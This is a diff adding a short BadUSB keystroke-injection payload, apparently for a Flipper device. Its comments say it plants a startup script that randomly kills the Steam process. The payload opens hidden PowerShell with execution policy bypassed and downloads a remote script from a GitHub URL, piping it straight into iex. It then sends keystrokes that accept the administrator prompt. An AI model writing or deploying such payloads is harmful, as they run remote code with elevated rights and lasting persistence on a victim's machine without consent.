@@ -1,0 +1,15 @@
+REM Creates a script in C:/temp/file.ps1 to randomally kill steam process. Creates a powershell shortcut in startup to autmatically run when user powers on device. 
+REM
+REM Open Powershell as Admin
+DEFAULT_DELAY 300
+DELAY 1000
+GUI r
+STRING powershell -w h -NoP -NonI -Exec Bypass irm https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/autostart.ps1 | iex
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
+DELAY 1000
+REM
+ENTER
+REM
